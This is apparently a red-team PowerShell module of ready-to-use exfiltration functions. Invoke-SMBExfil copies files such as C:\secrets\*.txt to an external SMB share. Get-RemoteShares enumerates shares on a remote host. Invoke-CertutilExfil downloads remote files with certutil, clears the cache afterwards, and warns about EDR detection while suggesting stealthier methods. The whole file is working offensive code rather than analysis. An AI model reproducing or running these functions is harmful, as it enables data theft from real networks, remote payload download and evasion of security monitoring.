<#
.SYNOPSIS
    Exfiltrate data via SMB file shares

.DESCRIPTION
    Copies files to an SMB share. Useful when you control a share on the
    target network or have set up an external SMB server.

.AUTHOR
    Anubhav Gain (@anubhavg-icpl)

.PARAMETER FilePath
    Local file(s) to exfiltrate

.PARAMETER SharePath
    UNC path to destination share

.PARAMETER Username
    Username for share authentication

.PARAMETER Password
    Password for share authentication

.EXAMPLE
    Invoke-SMBExfil -FilePath C:\secrets\*.txt -SharePath "\\your-server\share"
    Invoke-SMBExfil -FilePath C:\data.zip -SharePath "\\192.168.1.100\data" -Username "user" -Password "pass"
#>

function Invoke-SMBExfil {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string[]]$FilePath,

        [Parameter(Mandatory)]
        [string]$SharePath,

        [string]$Username,
        [string]$Password,

        [string]$DriveLetter = "X"
    )

    Write-Host @"

============================================================
  SMB DATA EXFILTRATION
============================================================
  Destination: $SharePath
  Files: $($FilePath.Count)
============================================================

"@ -ForegroundColor Cyan

    try {
        # Map drive if credentials provided
        if ($Username -and $Password) {
            Write-Host "[*] Mapping share with credentials..." -ForegroundColor Yellow

            # Disconnect existing mapping
            net use "${DriveLetter}:" /delete /y 2>$null | Out-Null

            # Connect with credentials
            $result = net use "${DriveLetter}:" $SharePath /user:$Username $Password 2>&1

            if ($LASTEXITCODE -ne 0) {
                throw "Failed to map share: $result"
            }

            $destPath = "${DriveLetter}:\"
            $mapped = $true
        }
        else {
            $destPath = $SharePath
            $mapped = $false
        }

        # Copy files
        foreach ($path in $FilePath) {
            $files = Get-ChildItem $path -ErrorAction SilentlyContinue

            foreach ($file in $files) {
                Write-Host "[*] Copying: $($file.Name) ($([math]::Round($file.Length / 1KB, 2)) KB)" -ForegroundColor Yellow

                try {
                    Copy-Item $file.FullName $destPath -Force
                    Write-Host "[+] Copied: $($file.Name)" -ForegroundColor Green
                }
                catch {
                    Write-Warning "Failed to copy $($file.Name): $_"
                }
            }
        }

        Write-Host "[+] Exfiltration complete" -ForegroundColor Green
    }
    catch {
        Write-Error "SMB exfiltration failed: $_"
    }
    finally {
        # Cleanup mapped drive
        if ($mapped) {
            Write-Host "[*] Disconnecting share..." -ForegroundColor Yellow
            net use "${DriveLetter}:" /delete /y 2>$null | Out-Null
        }
    }
}

function Get-RemoteShares {
    <#
    .SYNOPSIS
        Enumerate shares on a remote system

    .EXAMPLE
        Get-RemoteShares -ComputerName 192.168.1.100
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ComputerName
    )

    Write-Host "[*] Enumerating shares on $ComputerName..." -ForegroundColor Yellow

    try {
        $result = net view \\$ComputerName 2>&1

        if ($LASTEXITCODE -eq 0) {
            Write-Host $result
        }
        else {
            Write-Warning "Could not enumerate shares: $result"
        }
    }
    catch {
        Write-Error "Share enumeration failed: $_"
    }
}

function Test-ShareAccess {
    <#
    .SYNOPSIS
        Test read/write access to a share

    .EXAMPLE
        Test-ShareAccess -SharePath "\\server\share"
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$SharePath
    )

    Write-Host "[*] Testing access to $SharePath" -ForegroundColor Yellow

    $results = @{
        Read  = $false
        Write = $false
    }

    # Test read
    try {
        $items = Get-ChildItem $SharePath -ErrorAction Stop
        $results.Read = $true
        Write-Host "[+] Read access: Yes" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Read access: No" -ForegroundColor Red
    }

    # Test write
    try {
        $testFile = Join-Path $SharePath ".test_$(Get-Random).tmp"
        "test" | Out-File $testFile -ErrorAction Stop
        Remove-Item $testFile -Force
        $results.Write = $true
        Write-Host "[+] Write access: Yes" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Write access: No" -ForegroundColor Red
    }

    return $results
}

function Invoke-CertutilExfil {
    <#
    .SYNOPSIS
        Download/upload files using certutil (alternative method)

    .DESCRIPTION
        Uses certutil.exe for file transfers. Can encode files in base64.

    .EXAMPLE
        Invoke-CertutilExfil -Download -Url "http://server.com/file.exe" -Destination C:\temp\file.exe
    #>
    [CmdletBinding()]
    param(
        [Parameter(ParameterSetName = 'Download')]
        [switch]$Download,

        [Parameter(ParameterSetName = 'Download', Mandatory)]
        [string]$Url,

        [Parameter(ParameterSetName = 'Download')]
        [string]$Destination,

        [Parameter(ParameterSetName = 'Encode')]
        [switch]$Encode,

        [Parameter(ParameterSetName = 'Encode', Mandatory)]
        [string]$FilePath,

        [Parameter(ParameterSetName = 'Encode')]
        [string]$OutputPath
    )

    Write-Warning @"
DETECTION WARNING: certutil downloads are heavily monitored by EDR solutions.
This technique is flagged even by Windows Defender in many configurations.
Consider using PowerShell web requests or BITS instead.
"@

    if ($Download) {
        if (-not $Destination) {
            $Destination = Join-Path $env:TEMP (Split-Path $Url -Leaf)
        }

        Write-Host "[*] Downloading: $Url" -ForegroundColor Yellow

        $result = certutil.exe -urlcache -split -f $Url $Destination 2>&1

        if (Test-Path $Destination) {
            Write-Host "[+] Downloaded: $Destination" -ForegroundColor Green

            # Clean cache
            certutil.exe -urlcache $Url delete 2>$null | Out-Null
        }
        else {
            Write-Error "Download failed: $result"
        }
    }
    elseif ($Encode) {
        if (-not (Test-Path $FilePath)) {
            Write-Error "File not found: $FilePath"
            return
        }

        if (-not $OutputPath) {
            $OutputPath = "$FilePath.b64"
        }

        Write-Host "[*] Encoding: $FilePath" -ForegroundColor Yellow

        certutil.exe -encode $FilePath $OutputPath 2>&1 | Out-Null

        if (Test-Path $OutputPath) {
            Write-Host "[+] Encoded: $OutputPath" -ForegroundColor Green
        }
        else {
            Write-Error "Encoding failed"
        }
    }
}

# Export functions
Export-ModuleMember -Function Invoke-SMBExfil, Get-RemoteShares, Test-ShareAccess, Invoke-CertutilExfil
